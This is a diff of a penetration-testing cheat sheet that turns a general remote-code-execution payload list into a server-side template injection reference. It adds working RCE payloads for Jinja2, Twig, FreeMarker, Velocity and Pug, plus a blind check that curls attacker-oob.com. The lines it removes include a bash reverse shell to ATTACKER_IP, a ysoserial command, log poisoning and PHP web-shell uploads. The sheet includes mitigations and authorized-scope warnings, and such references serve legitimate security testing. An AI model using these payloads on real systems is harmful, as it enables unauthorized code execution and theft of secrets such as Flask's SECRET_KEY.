@@ -1,95 +1,132 @@
+# SSTI (SERVER-SIDE TEMPLATE INJECTION) ATTACK PAYLOADS
 
-## Server-Side Template Injection (SSTI) → RCE
+[PAYLOADALLTHETHINGS — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) · [TPLMAP](https://github.com/epinna/tplmap)
+
+Detection Probe (works across most engines)
+
+    curl -X POST -d 'name={{7*7}}' [URL]/render
+
+Engine Fingerprinting (different engines evaluate different syntax)
+
+    curl -X POST -d 'name=${7*7}' [URL]/render
+    curl -X POST -d 'name=#{7*7}' [URL]/render
+    curl -X POST -d 'name=<%= 7*7 %>' [URL]/render
+
+SSTI occurs when user input is concatenated into a template string *before* it's compiled, rather than passed in as data to a fixed template. The engine then evaluates the attacker's input as template syntax — not just text to display — which can range from reading server-side variables to full code execution depending on the engine's sandboxing (if any). Most SSTI attacks are really about walking an engine's accessible object graph from "whatever's in scope" back to a function capable of executing code.
+
+## Structure Reference
+
+| Part | Contains | Relevance |
+|---|---|---|
+| Template source | The literal template string the engine compiles | The attack surface — vulnerable when user input is embedded into this string (e.g. `render_template_string(f"Hello {name}")`), as opposed to passed as a separate context variable |
+| Rendering context | Variables/objects the template has access to during evaluation | What the attack actually walks — even a sandboxed engine usually exposes *some* objects, and those objects' attributes/methods are the path to more powerful ones |
+| Engine sandbox (if present) | Restrictions on which builtins/classes/methods are reachable from template syntax | The actual security boundary — every advanced SSTI payload is an attempt to find a path through the object graph that the sandbox didn't anticipate blocking |
+| Evaluation output | Reflected directly, reflected partially, or not reflected (blind) | Determines exploitation path — reflected SSTI confirms instantly via arithmetic; blind SSTI needs a side-effect (time delay, OOB callback) to confirm |
+
+## Detection & Engine Fingerprinting
 
 | Technique | Payload | Purpose |
 |---|---|---|
-| Detection probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | If the response reflects `49` instead of the literal string, user input is being evaluated as a template expression, not just rendered as text |
-| Jinja2 (Python) RCE | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Jinja2 sandboxes are commonly bypassable by walking Python's object graph back to `__builtins__` from any object in scope |
-| Twig (PHP) RCE | `{{ ['id'] \| map('system') \| join }}` | Abuses Twig filter chaining to reach a PHP function capable of shell execution |
-| FreeMarker (Java) RCE | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | `Execute` is a built-in FreeMarker utility class that directly shells out, intended for trusted templates only |
-| Velocity (Java) RCE | `#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Same object-graph-walking concept against the Velocity engine when direct class references are restricted |
+| Generic arithmetic probe | `{{7*7}}` | If the response reflects `49` instead of the literal string, input is being evaluated, not just displayed — confirms SSTI exists before identifying the specific engine |
+| Polyglot probe across syntaxes | `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{{7*'7'}}`, `${{7*7}}`, `@(7*7)` | Different engines use different delimiter syntax; firing several at once narrows down the engine by which one evaluates and what the result looks like |
+| String multiplication differentiator | `{{7*'7'}}` | Jinja2 (Python) returns `7777777` (string repetition) for this, while Twig (PHP) and other engines error or return something else — useful for distinguishing Python-backed engines from others once basic `{{ }}` syntax is confirmed |
+| Error-based fingerprinting | Submit deliberately malformed syntax (e.g. `{{`) and inspect the stack trace/error message | Unhandled template errors frequently leak the exact engine name, version, and file path in the response, which is often the fastest fingerprinting method when error display isn't suppressed |
+| Decision-tree payloads (tplmap-style) | A sequence of engine-specific probes tried in order, branching based on which response pattern matches | Mirrors what automated tools do — useful to replicate manually when a tool isn't available or its traffic pattern would be too noisy for the engagement |
 
-## Expression Language / Code Evaluation Injection
+## Jinja2 (Python / Flask)
 
 | Technique | Payload | Purpose |
 |---|---|---|
-| Spring EL (SpEL) injection | `${T(java.lang.Runtime).getRuntime().exec('id')}` | If user input reaches a Spring EL evaluation context (common in some validation annotations, older Spring Security configs), this directly invokes `Runtime.exec` |
-| OGNL injection (Struts-family) | `%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}` | OGNL is a Java expression language historically chained for high-profile RCE CVEs (e.g. Struts2); the payload disables member-access restrictions before invoking `ProcessBuilder` |
-| Node.js `vm`/`eval` injection | `require('child_process').execSync('id').toString()` (submitted where the app `eval()`s or passes to a poorly-sandboxed `vm` context) | Node's built-in `vm` module is explicitly documented as not a security boundary — anything reaching it with `require` accessible can escape to full Node API access |
-| Ruby `eval`/YAML injection | `YAML.load("--- !ruby/object:Gem::Requirement\n...")` (unsafe `YAML.load` deserializing a Ruby object) | Ruby's `YAML.load` (pre-Psych-safe-mode defaults) can instantiate arbitrary objects, chained similarly to Java/PHP deserialization gadgets |
+| Read a variable from context | `{{config}}` (Flask-specific) | Flask exposes its `config` object to every template by default — often leaks `SECRET_KEY` and other sensitive settings with zero further effort |
+| Walk to `__builtins__` via `__init__` | `{{ self.__init__.__globals__.__builtins__ }}` | Confirms whether the standard object-graph walk to Python builtins is reachable from `self` in this context |
+| Full RCE via `__builtins__.__import__` | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Once builtins are reachable, importing `os` and calling `popen` achieves command execution |
+| Sandbox-bypass without `self` (no-args chain) | `{{ ''.__class__.__mro__[1].__subclasses__() }}` then locate a subclass like `subprocess.Popen` by index and instantiate it | Used when `self` isn't in scope; walks from any string literal's class, up the MRO to `object`, and across all loaded subclasses to find one capable of execution |
+| Filter-based bypass (no `{{ }}` access, only filters) | `{{ 'id' \| attr('__class__') \| attr('__base__') \| ... }}` (chained `attr`/`map` filters reaching the same builtins path) | Used against hardened Jinja2 sandboxes (e.g. Flask's `SandboxedEnvironment`) that block direct attribute access but still expose filters that can be chained to the same effect |
 
-## File Upload / Inclusion → RCE
+## Twig (PHP)
+
+| Technique | Payload | Purpose |
+|---|---|---|
+| Detection | `{{7*7}}` | Twig uses the same `{{ }}` delimiter as Jinja2 — the string-multiplication differentiator above helps tell them apart once basic evaluation is confirmed |
+| RCE via filter chaining | `{{ ['id'] \| map('system') \| join }}` | Twig's `map` filter applies a named PHP function to each array element — `system` directly shells out, achieving RCE without needing a sandboxed-class object graph walk |
+| RCE via `filter` function | `{{ ['id'] \| filter('system') }}` | Alternate filter-based path to the same `system` call, useful if `map` specifically is blocked by an allowlist |
+
+## FreeMarker (Java)
+
+| Technique | Payload | Purpose |
+|---|---|---|
+| `Execute` utility class RCE | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | `Execute` is a built-in FreeMarker utility intended only for trusted templates, but is reachable from any context that allows `?new()` on class names |
+| `ObjectConstructor` RCE | `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}` | Alternate built-in utility achieving the same effect via direct `ProcessBuilder` instantiation rather than the `Execute` wrapper |
+
+## Velocity (Java)
+
+| Technique | Payload | Purpose |
+|---|---|---|
+| `Runtime.exec` via reflection | `#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Velocity restricts direct class references in many configurations, so this walks through reflection (`getClass().forName(...)`) starting from a plain string object already in scope |
+
+## Handlebars / Pug / Other JS-Ecosystem Engines
 
 | Technique | Payload (conceptual) | Purpose |
 |---|---|---|
-| Web shell upload via extension bypass | Upload `shell.php.jpg`, `shell.pHp`, or `shell.php%00.jpg` (null-byte legacy bypass) as an "image" | Tests whether extension/content-type validation is the only control, and whether the upload directory is web-accessible/executable |
-| Polyglot file upload | A file that is simultaneously a valid GIF and valid PHP (`GIF89a;<?php system($_GET['c']); ?>`) | Bypasses magic-byte/content-sniffing validation while still parsing as executable code if the server processes it as PHP |
-| Local File Inclusion (LFI) → RCE via log poisoning | Inject `<?php system($_GET['c']); ?>` into a request header (e.g. `User-Agent`) that gets written to an access log, then `include` the log file via an LFI parameter | Combines an LFI primitive with a write-what-you-include channel the attacker doesn't otherwise have direct upload access to |
-| LFI → RCE via PHP wrappers | `?page=php://filter/convert.base64-encode/resource=index.php` (read) or `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==` (execute, if `allow_url_include` is on) | `php://` and `data://` stream wrappers can turn a file-inclusion bug directly into code execution without needing a separate upload vector |
-| ZIP/archive extraction path traversal (Zip Slip) → RCE | Crafted archive entry named `../../../var/www/html/shell.php` extracted by a vulnerable unzip routine | Writes an attacker-controlled file outside the intended extraction directory, into a web-executable location |
+| Pug (formerly Jade) RCE | `#{ (function(){ return global.process.mainModule.require('child_process').execSync('id') })() }` | Pug compiles templates to JS functions — if user input reaches the template source (not just locals), this reaches Node's `child_process` directly |
+| Handlebars prototype-pollution-adjacent RCE | Crafted helper registration / `{{#with}}` block abuse documented in known Handlebars CVEs for the specific version in use | Handlebars is designed to be logic-less and harder to abuse directly; most known RCE paths are version-specific CVEs rather than a generic universal payload, so version fingerprinting matters more here than elsewhere |
 
 ## EXAMPLE PAYLOADS
 
-**OS command injection — full chain with reverse shell:**
-```bash
-# 1. Confirm injection (time-based, since no output channel)
-curl -X POST -d 'host=127.0.0.1;sleep 10' [URL]/ping
-
-# 2. Confirm with OOB callback
-curl -X POST -d 'host=127.0.0.1;curl http://attacker-oob.com/hit' [URL]/ping
-
-# 3. Escalate to interactive shell
-curl -X POST -d 'host=127.0.0.1;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' [URL]/ping
-```
-
-**Jinja2 SSTI full chain:**
+**Jinja2 full chain (detection → context leak → RCE):**
 ```python
 # 1. Detection
 {{7*7}}
-# Response contains 49 -> confirmed SSTI
+# Response contains 49 -> confirmed template evaluation
 
-# 2. RCE
+# 2. Differentiate from Twig/other {{ }} engines
+{{7*'7'}}
+# Response contains 7777777 -> confirms Python/Jinja2-family engine
+
+# 3. Leak Flask config (often sufficient on its own — may contain SECRET_KEY)
+{{config}}
+
+# 4. Full RCE
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-**Java deserialization via ysoserial (conceptual):**
-```bash
-java -jar ysoserial.jar CommonsCollections6 'curl http://attacker-oob.com/hit' > payload.bin
-curl -X POST --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object' [URL]/api/load
+**Jinja2 sandbox-bypass chain (no `self`, walking via string MRO):**
+```python
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# Inspect output, locate index of a usable subclass (e.g. subprocess.Popen), then:
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
 ```
 
-**LFI to RCE via log poisoning:**
-```bash
-# 1. Poison the access log via User-Agent
-curl -A '<?php system($_GET["c"]); ?>' [URL]/
-
-# 2. Include the log file and trigger execution
-curl '[URL]/index.php?page=../../../../var/log/apache2/access.log&c=id'
+**Twig RCE via filter chaining:**
+```twig
+{{ ['id'] | map('system') | join }}
 ```
 
-**File upload extension bypass:**
-```bash
-curl -F 'file=@shell.php.jpg;filename=shell.php.jpg;type=image/jpeg' \
-  -F 'PHP_CONTENT=<?php system($_GET["c"]); ?>' \
-  [URL]/upload
+**FreeMarker RCE via Execute utility:**
+```freemarker
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+**Blind SSTI confirmation via OOB (when no output is reflected):**
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://attacker-oob.com/ssti-hit').read() }}
 ```
 
 ## Tooling Note
 
-Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: **ysoserial** / **ysoserial.net** for Java/.NET deserialization gadget chains, **tplmap** for automated SSTI detection and exploitation across engines, **Commix** for automated command injection detection, and **revshells.com** for generating context-appropriate reverse shell one-liners. Stay within strict authorized scope and a pre-agreed rules of engagement — RCE is the highest-impact finding class possible and any payload beyond the agreed proof-of-concept (e.g. `id`/`whoami`/`sleep`) risks causing real, irreversible damage to production systems.
+Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: **tplmap** for automated detection and exploitation across Jinja2, Twig, Freemarker, Velocity, Smarty, and more in one scan, and **Burp Suite's** active scanner for basic `{{7*7}}`-style detection during broader crawls. Stay within authorized scope — SSTI frequently leads directly to RCE (see the RCE cheat sheet's SSTI section for the broader execution-impact context), and any payload beyond the agreed proof-of-concept risks real, irreversible impact on production systems.
 
 ## Mitigations (for writeups)
 
-- Never construct shell commands by concatenating user input — use parameterized APIs (`subprocess.run([...])` with a list, not `shell=True`) that don't invoke a shell interpreter at all.
-- Never deserialize untrusted data with formats capable of arbitrary object instantiation (Java native serialization, Python `pickle`, PHP `unserialize()`, unsafe YAML) — use data-only formats (JSON) or signed/integrity-checked payloads instead.
-- Use a logic-less or sandboxed template engine for any template rendered with user-influenced content, and never pass user input directly into `render_template_string`-style APIs.
-- Avoid exposing expression-language evaluation (SpEL, OGNL, EL) to any user-controlled input; if dynamic evaluation is unavoidable, use a strict, audited allowlist-based evaluator instead of the full language.
-- Validate file uploads by content (magic bytes, re-encoding images) rather than extension/content-type alone, store uploads outside the web root or in non-executable storage, and serve them with a fixed, non-executable content type.
-- Validate and canonicalize any path used in file inclusion/reading against an allowlist of expected files; never let user input directly select an arbitrary path, and disable dangerous stream wrappers (`allow_url_include`) where not required.
-- Run application processes with least-privilege OS accounts so a successful RCE has minimal lateral/escalation value even if achieved.
+- Never construct a template string by concatenating or formatting user input into it — always pass user-controlled data as a context *variable* to a fixed, developer-authored template, never as part of the template source itself.
+- Avoid `render_template_string`-style APIs (or equivalents in other engines) entirely for anything touching user input; use named template files with variables passed in.
+- If user-influenced templates are a genuine product requirement (e.g. customizable email templates), use a logic-less engine (Mustache, Handlebars in its default logic-less mode) rather than a full-featured engine with object-graph access.
+- Run any necessary dynamic template evaluation in a properly isolated sandbox (separate process, minimal permissions, no filesystem/network access) rather than relying solely on the template engine's built-in sandboxing, since most engine sandboxes have a documented history of bypasses.
+- Keep template engines patched — several of the engine-specific RCE paths above (especially in the JS ecosystem) are tied to specific CVEs rather than being evergreen, generic techniques.
+- Suppress detailed template error messages/stack traces in production responses, since they routinely leak the engine name, version, and file paths that accelerate exploitation.
 
 ## Quick Notes
 
-- RCE is an impact category, not a root cause — always identify and name the specific underlying flaw (command injection, deserialization, SSTI, EL injection, file upload/inclusion) for an accurate writeup rather than just "RCE was achieved."
-- Confirm execution with the least invasive payload that proves the point (`sleep`, OOB callback, `id`/`whoami`) before ever considering a reverse shell — a confirmed sandboxed proof is sufficient for almost any report.
-- A successful RCE finding is typically the highest severity possible in any assessment; treat scope, authorization, and blast-radius limits as non-negotiable regardless of how easy the path in turns out to be.
+- SSTI exists on a spectrum — some findings only leak in-scope variables (still potentially sensitive, e.g. Flask's `config`), while others reach full RCE; confirm and report the actual achieved impact rather than assuming detection alone means RCE.
+- The `{{7*7}}` → `49` test is the standard first probe across nearly every engine family; differentiate the specific engine next (string multiplication, error messages, delimiter syntax) before reaching for engine-specific payloads.
+- A successful SSTI-to-RCE chain is functionally a code execution finding — apply the same severity, scope discipline, and minimal-payload practices described in the RCE cheat sheet once you've confirmed evaluation is happening.
